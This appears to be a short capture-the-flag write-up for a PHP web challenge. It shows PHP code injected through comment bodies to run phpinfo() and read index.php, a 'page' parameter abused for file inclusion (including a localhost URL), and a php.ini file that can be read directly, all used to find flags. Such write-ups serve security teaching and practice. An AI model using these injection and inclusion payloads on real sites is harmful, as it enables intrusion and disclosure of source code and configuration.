Test path accessiblity

```html
http://34.74.105.127/9ec2869b99/index.php
```

Create comment with body

```php
  <?php phpinfo() ?>
```
Submit to get a flag

By viewing page source found a path to admin login page

```html
  http://34.74.105.127/9ec2869b99/?page=admin.auth.inc
```

Try another value of page

```html
  http://34.74.105.127/9ec2869b99/?page=xx
```
An error message was received

```php
  Warning: include(xx.php): failed to open stream: No such file or directory
```
So the value of page is a filename without suffix

Keep on trying, seems subpath php.ini is accessible

```html
  http://34.74.105.127/9ec2869b99/php.ini
```

Try another possible file name

```html
  http://34.74.105.127/9ec2869b99/?page=admin.inc
```
It leads to a flag at the bottom of the response page


Comment with content

```php
  <?php echo file_get_contents('index.php');?>
```
Approve this comment in 'Pending Comments' page.

Visit home page via

```html
  http://34.74.105.127/9ec2869b99/?page=http://localhost/index
```

Found the 3rd flag in source code of ```index.php```
